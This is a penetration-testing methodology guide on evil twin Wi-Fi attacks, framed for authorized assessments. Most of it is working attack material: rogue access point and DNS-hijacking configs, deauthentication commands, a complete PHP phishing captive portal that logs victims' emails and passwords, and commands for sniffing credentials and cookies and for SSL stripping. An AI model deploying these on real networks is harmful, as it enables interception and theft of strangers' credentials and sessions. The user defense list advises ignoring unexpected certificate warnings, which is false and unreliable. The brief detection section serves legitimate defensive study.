---
title: Evil Twin Attacks
category: methodology
tags:
  - wireless
  - evil-twin
  - rogue-ap
  - hostapd
  - captive-portal
  - credential-harvesting
last_updated: 2025-12-28
---

# Evil Twin Attacks

Comprehensive guide to creating rogue access points for wireless security assessments, including captive portal attacks and credential harvesting techniques.

## Table of Contents

- [Overview](#overview)
- [Attack Flow](#attack-flow)
- [Prerequisites](#prerequisites)
- [Creating Rogue Access Point](#creating-rogue-access-point)
- [DHCP Server Setup](#dhcp-server-setup)
- [Captive Portal Creation](#captive-portal-creation)
- [Credential Harvesting](#credential-harvesting)
- [HTTPS Considerations](#https-considerations)
- [Automated Tools](#automated-tools)
- [Detection and Defense](#detection-and-defense)

## Overview

An evil twin attack creates a malicious access point that impersonates a legitimate network, tricking users into connecting and potentially revealing credentials or sensitive data.

### Attack Types

| Type | Description | Objective |
|------|-------------|-----------|
| Basic Evil Twin | Clone AP to intercept traffic | MITM, credential theft |
| Karma Attack | Respond to all probe requests | Capture opportunistic connections |
| Captive Portal | Fake login page | Harvest network/service credentials |
| HTTPS Stripping | Downgrade HTTPS to HTTP | Intercept encrypted traffic |

### Use Cases in Pentesting

- Assess user security awareness
- Test network detection capabilities
- Evaluate credential handling practices
- Demonstrate WiFi security risks

## Attack Flow

```
1. Reconnaissance
   - Identify target network (ESSID, BSSID, channel)
   - Enumerate connected clients

2. Preparation
   - Configure rogue AP with matching ESSID
   - Set up DHCP server
   - Prepare captive portal (optional)

3. Execution
   - Deauthenticate legitimate clients
   - Force reconnection to rogue AP
   - Intercept traffic/credentials

4. Post-Exploitation
   - Analyze captured data
   - Pivot to network attacks
```

## Prerequisites

### Hardware Requirements

| Component | Purpose |
|-----------|---------|
| Wireless adapter (monitor mode) | Create rogue AP |
| Second adapter (optional) | Internet forwarding |
| High-gain antenna | Improved signal coverage |

### Software Requirements

```bash
# Core packages
apt install hostapd dnsmasq apache2 php

# Additional tools
apt install iptables net-tools

# Monitoring
apt install wireshark tcpdump
```

### Network Configuration

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Or permanently in sysctl.conf
echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf
sysctl -p
```

## Creating Rogue Access Point

### Using hostapd

Create configuration file `/etc/hostapd/evil-twin.conf`:

```ini
# Interface configuration
interface=wlan0
driver=nl80211

# Network settings
ssid=TargetNetwork
channel=6
hw_mode=g

# Security (open network for captive portal)
auth_algs=1
wpa=0

# Optional: WPA2 (if you have the password)
# wpa=2
# wpa_passphrase=password123
# wpa_key_mgmt=WPA-PSK
# rsn_pairwise=CCMP
```

### Start the Rogue AP

```bash
# Set interface to monitor mode first
airmon-ng start wlan0

# Stop monitor mode for AP mode
airmon-ng stop wlan0mon

# Configure interface
ip link set wlan0 down
iw dev wlan0 set type __ap
ip link set wlan0 up

# Assign IP address
ip addr add 192.168.1.1/24 dev wlan0

# Start hostapd
hostapd /etc/hostapd/evil-twin.conf
```

### Deauthenticate Legitimate Clients

Run in parallel to force clients to reconnect:

```bash
# Using aireplay-ng (requires separate monitor interface)
aireplay-ng -0 0 -a <LEGITIMATE_AP_BSSID> wlan1mon

# Using mdk4 for more aggressive deauth
mdk4 wlan1mon d -B <LEGITIMATE_AP_BSSID>
```

## DHCP Server Setup

### Using dnsmasq

Create configuration file `/etc/dnsmasq-evil.conf`:

```ini
# Interface binding
interface=wlan0
bind-interfaces

# DHCP configuration
dhcp-range=192.168.1.10,192.168.1.250,12h
dhcp-option=3,192.168.1.1    # Gateway
dhcp-option=6,192.168.1.1    # DNS

# DNS configuration
address=/#/192.168.1.1        # Redirect all DNS to our server

# Logging
log-queries
log-dhcp
```

### Start DHCP Server

```bash
# Stop system dnsmasq if running
systemctl stop dnsmasq

# Start with custom config
dnsmasq -C /etc/dnsmasq-evil.conf -d
```

### Verify DHCP Operation

```bash
# Monitor DHCP leases
tail -f /var/lib/misc/dnsmasq.leases

# Check dnsmasq logs
journalctl -u dnsmasq -f
```

## Captive Portal Creation

### Web Server Setup

Configure Apache to serve captive portal:

```bash
# Enable required modules
a2enmod rewrite
a2enmod ssl

# Create portal directory
mkdir -p /var/www/portal
```

### Basic Captive Portal Page

Create `/var/www/portal/index.php`:

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $log_file = '/var/log/portal_creds.txt';
    $timestamp = date('Y-m-d H:i:s');
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $client_ip = $_SERVER['REMOTE_ADDR'];

    $log_entry = "[$timestamp] IP: $client_ip | Email: $email | Password: $password\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND);

    // Redirect to internet (optional)
    header('Location: http://www.google.com');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; }
        .container { max-width: 400px; margin: 50px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0066cc; color: white; border: none; cursor: pointer; }
        button:hover { background: #0052a3; }
    </style>
</head>
<body>
    <div class="container">
        <h2>WiFi Authentication Required</h2>
        <p>Please enter your credentials to access the network.</p>
        <form method="POST">
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
```

### Apache Virtual Host

Create `/etc/apache2/sites-available/portal.conf`:

```apache
<VirtualHost *:80>
    DocumentRoot /var/www/portal

    <Directory /var/www/portal>
        Options -Indexes
        AllowOverride All
        Require all granted
    </Directory>

    # Redirect all requests to portal
    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/index\.php
    RewriteRule ^(.*)$ /index.php [L,R=302]

    ErrorLog ${APACHE_LOG_DIR}/portal_error.log
    CustomLog ${APACHE_LOG_DIR}/portal_access.log combined
</VirtualHost>
```

### Enable Portal Site

```bash
a2dissite 000-default
a2ensite portal
systemctl restart apache2
```

## Credential Harvesting

### Monitor Captured Credentials

```bash
# Watch credential log
tail -f /var/log/portal_creds.txt

# Parse and format
awk -F'|' '{print $2, $3}' /var/log/portal_creds.txt
```

### Traffic Interception

```bash
# Capture all HTTP traffic
tcpdump -i wlan0 -w http_traffic.pcap port 80

# Monitor in real-time with tshark
tshark -i wlan0 -Y "http.request.method == POST" -T fields -e http.host -e http.request.uri -e urlencoded-form.value

# Extract credentials from pcap
tcpdump -A -r http_traffic.pcap | grep -E "(user|pass|login|email)"
```

### Cookie Stealing

```bash
# Capture cookies with tshark
tshark -i wlan0 -Y "http.cookie" -T fields -e http.cookie

# Use Wireshark filter
http.cookie contains "session"
```

## HTTPS Considerations

### The HTTPS Challenge

Modern browsers enforce HTTPS, making credential interception difficult:

| Challenge | Impact |
|-----------|--------|
| HSTS | Browser refuses HTTP for known sites |
| Certificate warnings | Users may not proceed |
| Browser security | Mixed content blocked |

### SSL Stripping with Bettercap

```bash
# Start bettercap
bettercap -iface wlan0

# Enable SSL stripping
set http.proxy.sslstrip true
set net.sniff.local true
http.proxy on
net.sniff on
```

### Self-Signed Certificates

```bash
# Generate certificate
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/ssl/private/portal.key \
    -out /etc/ssl/certs/portal.crt \
    -subj "/CN=secure-wifi.local"

# Configure Apache for HTTPS
a2enmod ssl
```

### Limitations

- Self-signed certificates trigger browser warnings
- HSTS preloaded sites cannot be stripped
- Certificate pinning in apps prevents interception
- User education reduces effectiveness

## Automated Tools

### Wifiphisher

Automated evil twin and phishing attacks:

```bash
# Install
git clone https://github.com/wifiphisher/wifiphisher.git
cd wifiphisher && pip3 install .

# Run with automatic AP selection
wifiphisher

# Specify target and template
wifiphisher -e "TargetNetwork" -p oauth-login
```

### Fluxion

Automated WPA handshake capture and evil twin:

```bash
# Run Fluxion
./fluxion.sh

# Follows interactive menu for:
# 1. Target selection
# 2. Handshake capture
# 3. Evil twin creation
# 4. Captive portal deployment
```

### Bettercap

Network attack framework with evil twin capabilities:

```bash
# Create evil twin
set wifi.ap.ssid TargetNetwork
set wifi.ap.channel 6
wifi.ap on

# Enable captive portal
set http.proxy.script /path/to/portal.js
http.proxy on
```

## Detection and Defense

### Detection Methods

| Method | Description |
|--------|-------------|
| WIDS/WIPS | Wireless intrusion detection systems |
| BSSID monitoring | Detect duplicate SSIDs with different BSSIDs |
| Signal analysis | Detect abnormal signal patterns |
| Certificate validation | Require valid certificates |

### Defensive Measures

For organizations:

```
1. Deploy wireless intrusion prevention systems
2. Use 802.1X authentication (EAP-TLS)
3. Implement certificate-based authentication
4. Monitor for rogue access points
5. Educate users about public WiFi risks
```

For users:

```
1. Verify network authenticity before connecting
2. Use VPN on untrusted networks
3. Ignore unexpected certificate warnings
4. Avoid entering credentials on captive portals
5. Use cellular data for sensitive transactions
```

### Rogue AP Detection Commands

```bash
# Scan for duplicate SSIDs
airodump-ng wlan0mon | grep "TargetNetwork"

# Compare BSSIDs and signal strength
# Legitimate AP: consistent BSSID, stable signal
# Evil twin: different BSSID, variable signal
```

---

*Evil twin attacks require explicit authorization. Unauthorized deployment is illegal.*
